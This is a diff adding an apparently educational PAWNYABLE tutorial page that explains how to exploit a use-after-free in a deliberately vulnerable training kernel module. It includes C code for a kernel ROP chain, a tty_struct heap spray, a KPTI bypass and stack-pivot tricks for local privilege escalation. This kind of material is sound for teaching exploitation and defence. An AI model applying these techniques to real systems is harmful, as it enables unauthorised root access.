@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta name="og:url" content="https://pawnyable.cafe//en/linux-kernel/LK01/use_after_free.html">
+
+    <meta name="og:title" content="Holstein v3: Exploiting Use-after-Free - PAWNYABLE!">
+
+<meta name="og:image" content="https://pawnyable.cafe/pawnyable.ogp.png">
+<meta name="og:description" content="もふもふpwnワールド">
+<meta name="og:type" content="website">
+<meta name="og:site_name" content="PAWNYABLE!">
+
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ptr-yudai">
+
+
+    <meta name="subtitle" content="pawnyable">
+
+
+    <meta name="description" content="Let's learn pwnable with cute animals.">
+
+
+    <meta name="keywords" content="linux,windows,kernel,browser,vm,exploit,exploitation,binary exploit,pwn,pwnable">
+
+
+
+
+<title>Holstein v3: Exploiting Use-after-Free | PAWNYABLE!</title>
+
+
+
+    <link rel="icon" href="/favicon.png">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+  <style type="text/css">
+.spoiler {
+  display: inline;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><meta name="generator" content="Hexo 5.4.2"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      
+<div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/en/">PAWNYABLE</a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/en/practice/">Practice</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/en/about/">About</a>
+              </li> 
+                   
+          
+        </ul>
+      </nav>
+      
+<div class="language-switcher">
+  
+    
+      <a class="language-link" href="/linux-kernel/LK01/use_after_free">JA</a>
+    
+  
+    
+      <a class="language-link language-link-active" href="/en/linux-kernel/LK01/use_after_free">EN</a>
+    
+  
+    
+      <a class="language-link" href="/kr/linux-kernel/LK01/use_after_free">KR</a>
+    
+  
+</div>
+
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    
+<div class="post-head">
+    <div class="post-info">
+        <div class="post-title">
+            
+                Holstein v3: Exploiting Use-after-Free
+                        
+        </div>
+    </div>
+    <div class="h-line-primary"></div>
+    
+<div class="language-switcher">
+  
+    
+      <a class="language-link" href="/linux-kernel/LK01/use_after_free">JA</a>
+    
+  
+    
+      <a class="language-link language-link-active" href="/en/linux-kernel/LK01/use_after_free">EN</a>
+    
+  
+    
+      <a class="language-link" href="/kr/linux-kernel/LK01/use_after_free">KR</a>
+    
+  
+</div>
+
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="heap_overflow.html">Previous</a></div>
+            <div class="pagination-index"><a href="../index.html">Contents</a></div>
+            <div class="pagination-fd"><a href="race_condition.html">Next</a></div>
+        </div>
+    
+    
+        <div class="column" title="Table of Contents">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyzing-the-patch-and-investigating-the-vulnerability"><span class="toc-text">Analyzing the patch and investigating the vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypassing-KASLR"><span class="toc-text">Bypassing KASLR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Building-kROP"><span class="toc-text">Building kROP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bonus-RIP-control-and-bypassing-SMEP"><span class="toc-text">Bonus: RIP control and bypassing SMEP</span></a></li></ol>
+        </div>
+    
+</div>
+
+    <div class="post-content">
+    <p>In the previous chapter we escalated privileges by exploiting a heap overflow in the Holstein module. Once again, the author of Holstein patched the vulnerability and released Holstein v3. In this chapter we will exploit the improved Holstein v3 module.</p>
+<h2 id="Analyzing-the-patch-and-investigating-the-vulnerability">Analyzing the patch and investigating the vulnerability</h2>
+<p>First, download <a href="distfiles/LK01-3.tar.gz">Holstein v3</a>.</p>
+<p>There are two main differences from v2. First, <code>open</code> now uses <code>kzalloc</code> when allocating the buffer.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">g_buf = kzalloc(BUFFER_SIZE, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!g_buf) &#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;kmalloc failed&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Like <code>kmalloc</code>, <code>kzalloc</code> allocates memory from the kernel heap, but it also zero-fills the allocation afterward. In other words, <code>kzalloc</code> plays a role similar to <code>calloc</code> in userland.</p>
+<p>Second, <code>read</code> and <code>write</code> now include size checks to stop heap overflows.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">module_read</span><span class="params">(<span class="keyword">struct</span> file *file,</span></span><br><span class="line"><span class="params">                           <span class="type">char</span> __user *buf, <span class="type">size_t</span> count,</span></span><br><span class="line"><span class="params">                           <span class="type">loff_t</span> *f_pos)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_read called\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (count &gt; BUFFER_SIZE) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;invalid buffer size\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (copy_to_user(buf, g_buf, count)) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;copy_to_user failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">module_write</span><span class="params">(<span class="keyword">struct</span> file *file,</span></span><br><span class="line"><span class="params">                            <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> count,</span></span><br><span class="line"><span class="params">                            <span class="type">loff_t</span> *f_pos)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_write called\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (count &gt; BUFFER_SIZE) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;invalid buffer size\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(g_buf, buf, count)) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;copy_from_user failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>So, in this version of the module, we can no longer trigger a heap overflow.</p>
+<p>Now look at the implementation of <code>close</code>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_close called\n&quot;</span>);</span><br><span class="line">  kfree(g_buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>The buffer is freed with <code>kfree</code> once it is no longer needed, but the pointer remains stored in <code>g_buf</code>. If we could still access <code>g_buf</code> after <code>close</code>, we would have a use-after-free.</p>
+<p>Some readers may think: “But once you call <code>close</code>, you can no longer <code>read</code> or <code>write</code> through that file descriptor, so a use-after-free should not happen.” That is true for a single descriptor, but this is where it helps to remember how kernel code behaves.</p>
+<p>Inside the kernel, the same resource may be shared by multiple programs. The Holstein module is not limited to a single <code>open</code>; multiple programs, or even one program, can call <code>open</code> multiple times. What happens if we use it like this?</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line"><span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line">close(fd1);</span><br><span class="line">write(fd2, <span class="string">&quot;Hello&quot;</span>, <span class="number">5</span>);</span><br></pre></td></tr></table></figure>
+<p>The first <code>open</code> allocates <code>g_buf</code>, but the second <code>open</code> replaces <code>g_buf</code> with a new buffer. The old one is left allocated, causing a memory leak. Next, <code>close(fd1)</code> frees <code>g_buf</code>. At that point <code>fd1</code> is dead, but <code>fd2</code> is still valid, so we can still read from and write to the freed <code>g_buf</code>. That gives us a use-after-free.</p>
+<p>This is a good example of why kernel code must be designed with <strong>shared resources across multiple callers</strong> in mind. If you forget that property, it is very easy to introduce vulnerabilities.</p>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_thinking.png" alt="Wolf" ></div>
+  <p class="says">
+    If `close` cleared the pointer to `NULL`, or if `open` failed whenever `g_buf` was already allocated, this particular bug would have been much harder to introduce.<br>
+    Whether that is really enough is something we will revisit in the next chapter.
+  </p>
+</div>
+<h2 id="Bypassing-KASLR">Bypassing KASLR</h2>
+<p>As a first step, let’s leak the kernel base address and the address of <code>g_buf</code>.<br>
+Even though the bug is now a use-after-free instead of a heap overflow, the buffer size is still <code>0x400</code>, so <code>tty_struct</code> is still useful.</p>
+<h2 id="Building-kROP">Building kROP</h2>
+<p>At this point we can already do ROP. We only need to prepare a fake <code>tty_operations</code> and pivot the stack into a ROP chain.</p>
+<p>However, unlike the previous chapter, we are dealing with a use-after-free, so the memory we can currently control overlaps with a <code>tty_struct</code>. Naturally, when we use <code>tty_operations</code> through <code>ioctl</code> and similar paths, the <code>tty_struct</code> contains many fields that are not directly referenced. In principle, some of those bytes could be reused to store both the ROP chain and the fake <code>tty_operations</code>.</p>
+<p>That said, massively corrupting the structure we are about to use for exploitation can create unintended instability later on, and it may also severely limit the size and layout of the ROP chain. It is better to allocate the <code>tty_struct</code> and the actual ROP chain in separate regions if possible.</p>
+<p>So this time we trigger a second use-after-free. Since there is only one <code>g_buf</code>, we first write the ROP chain and fake <code>tty_operations</code> into the current <code>g_buf</code>, whose address we already know. Then we trigger another use-after-free elsewhere and overwrite the function table of that second <code>tty_struct</code>. This way we only replace the function table pointer in the live <code>tty_struct</code>, which gives us a more stable exploit.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ROP chain</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *chain = (<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf;</span><br><span class="line">*chain++ = rop_pop_rdi;</span><br><span class="line">*chain++ = <span class="number">0</span>;</span><br><span class="line">*chain++ = addr_prepare_kernel_cred;</span><br><span class="line">*chain++ = rop_pop_rcx;</span><br><span class="line">*chain++ = <span class="number">0</span>;</span><br><span class="line">*chain++ = rop_mov_rdi_rax_rep_movsq;</span><br><span class="line">*chain++ = addr_commit_creds;</span><br><span class="line">*chain++ = rop_bypass_kpti;</span><br><span class="line">*chain++ = <span class="number">0xdeadbeef</span>;</span><br><span class="line">*chain++ = <span class="number">0xdeadbeef</span>;</span><br><span class="line">*chain++ = (<span class="type">unsigned</span> <span class="type">long</span>)&amp;win;</span><br><span class="line">*chain++ = user_cs;</span><br><span class="line">*chain++ = user_rflags;</span><br><span class="line">*chain++ = user_rsp;</span><br><span class="line">*chain++ = user_ss;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fake tty_operations</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf[<span class="number">0x3f8</span>] = rop_push_rdx_xor_eax_415b004f_pop_rsp_rbp;</span><br><span class="line"></span><br><span class="line">write(fd2, buf, <span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Second use-after-free</span></span><br><span class="line"><span class="type">int</span> fd3 = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line"><span class="type">int</span> fd4 = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (fd3 == <span class="number">-1</span> || fd4 == <span class="number">-1</span>)</span><br><span class="line">  fatal(<span class="string">&quot;/dev/holstein&quot;</span>);</span><br><span class="line">close(fd3);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">50</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">  spray[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);</span><br><span class="line">  <span class="keyword">if</span> (spray[i] == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/ptmx&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Overwrite the function table pointer</span></span><br><span class="line">read(fd4, buf, <span class="number">0x400</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf[<span class="number">0x18</span>] = g_buf + <span class="number">0x3f8</span> - <span class="number">12</span>*<span class="number">8</span>;</span><br><span class="line">write(fd4, buf, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Control RIP</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">50</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">  ioctl(spray[i], <span class="number">0</span>, g_buf - <span class="number">8</span>); <span class="comment">// rsp=rdx; pop rbp;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>If privileges were escalated, the exploit succeeded. You can download the full exploit from <a href="exploit/uaf-krop.c">here</a>.</p>
+<center>
+  <img src="img/uaf_privesc.png" alt="Privilege escalation through UAF" style="width:320px;">
+</center>
+<p>This is why heap overflows and use-after-free bugs are often easier to exploit in kernel space than the same bug classes in userland. The kernel heap is shared, and there are many useful objects with function pointers and other sensitive fields that can be repurposed during exploitation.</p>
+<p>The flip side is also important: if you cannot find a useful target structure in the same size class as the vulnerable object, exploitation becomes much harder.</p>
+<h2 id="Bonus-RIP-control-and-bypassing-SMEP">Bonus: RIP control and bypassing SMEP</h2>
+<p>In this chapter we bypassed all the relevant mitigations.<br>
+As mentioned briefly in the previous chapter, there is another simple trick when SMAP is disabled but SMEP is enabled. Suppose you already gained RIP control and can call a gadget like this:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81516264: mov esp, 0x39000000; ret;</span><br></pre></td></tr></table></figure>
+<p>If you <code>mmap</code> user memory at <code>0x39000000</code> in advance and place your ROP chain there, this gadget will pivot the stack into that userland ROP chain. In that case you do not need to store the ROP chain inside kernel memory or leak the address of a kernel heap region first.</p>
+<p>One caveat is that <code>RSP</code> should end up aligned to an 8-byte boundary. Otherwise, if the kernel executes an instruction that requires aligned stack state, the exploit may crash.</p>
+<p>Also, functions such as <code>commit_creds</code> and <code>prepare_kernel_cred</code> consume some stack space, so in practice you should map slightly below <code>0x39000000</code> and leave some room. A margin of around <code>0x8000</code> bytes is usually enough.</p>
+<p>Try disabling SMAP and escalating privileges by pivoting into a userland ROP chain with such a gadget. When <code>mmap</code>ing the pivot target, add the <code>MAP_POPULATE</code> flag. That forces physical memory to be populated so that the mapping remains visible from the kernel even when KPTI is enabled.</p>
+<hr>
+<div class="column" title="Exercise 1">
+  Try escalating privileges without ROP, for example by overwriting <code>modprobe_path</code> or fields inside a <code>cred</code> structure.<br>
+</div>
+
+</div> 
+
+<div style="margin-top: 1em">
+    <div class="h-line-primary"></div>
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="heap_overflow.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"><a href="race_condition.html">次のページへ</a></div>
+        </div>
+    
+</div>
+
+<script>
+    window.onload = detectors();
+</script>
+
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+                © 2023 ptr-yudai 🐈
+                <br>
+            
+            
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+  </body>
+</html>
